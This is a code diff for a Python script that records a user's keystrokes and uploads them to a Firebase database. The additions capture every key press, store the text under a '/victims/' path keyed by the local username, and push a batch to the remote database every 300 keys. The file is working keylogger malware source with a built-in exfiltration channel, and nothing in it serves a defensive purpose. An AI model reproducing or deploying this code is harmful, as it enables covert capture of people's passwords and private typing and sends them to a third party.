@@ -2,45 +2,46 @@ import firebase_admin
 from firebase_admin import credentials
 from firebase_admin import db
 import re
-import os
-import pwd
-def get_username():
-    # Use 'os.getuid()' to get the user ID of the current user, and then pass it to 'pwd.getpwuid' to get the user information.
-    # The '[0]' index extracts the username from the user information.
-    return pwd.getpwuid(os.getuid())[0]
-victm = get_username()
+from datetime import datetime
+import keyboard
+import getpass
+victm = getpass.getuser()
 keylogs = "[START LOG] "
+count = 0
+start = True
 with open('settings.txt', 'r') as file:
-        # Read the file line by line
         lines = file.readlines()
-        # Iterate over the lines
         for i in range(0, len(lines), 2):
-            if i + 1 < len(lines):  # Check if there are enough lines left in the file
+            if i + 1 < len(lines):
                 credspath = re.search(r'credspath="(.*?)"', lines[i])
                 urlpath = re.search(r'firebaseappurlpath="(.*?)"', lines[i + 1])
                 if credspath and urlpath:
                     credsfinal = credspath.group(1)
                     urlfinal = urlpath.group(1)
-# Initialize Firebase with your service account credentials
 cred = credentials.Certificate(credsfinal)
 firebase_admin.initialize_app(cred, {
     'databaseURL': str(urlfinal)
 })
-
-# Get a reference to the Firebase Realtime Database
-ref = db.reference('/')
-
-# Define the data you want to write
-data = {
-    'victims': {
-        str(victm): {
-            'name': str(victm),
-            'logs': str(keylogs)
+ref = db.reference('/victims/'+victm)
+keylogs = "[START LOG] "
+def on_key_event(event):
+    global keylogs
+    global count
+    if event.event_type == keyboard.KEY_DOWN:
+        count+=1
+        key_name = event.name
+        if key_name != "space" :
+            keylogs += key_name
+        else:
+            keylogs += " "
+        print("Current text:", keylogs)
+        data = {
+            'logs at ' +  str(datetime.now().strftime("%H:%M:%S")) : str(keylogs) + " [END LOG]",
         }
-    }
-}
-
-# Push the data to the database
-ref.update(data)
-
-print("Data written successfully.")
+        if count >= 300:
+            ref.update(data)
+            print("Data written successfully.") 
+            count = 0
+            keylogs = "[START LOG] "
+keyboard.on_press(on_key_event)
+keyboard.wait('esc')              
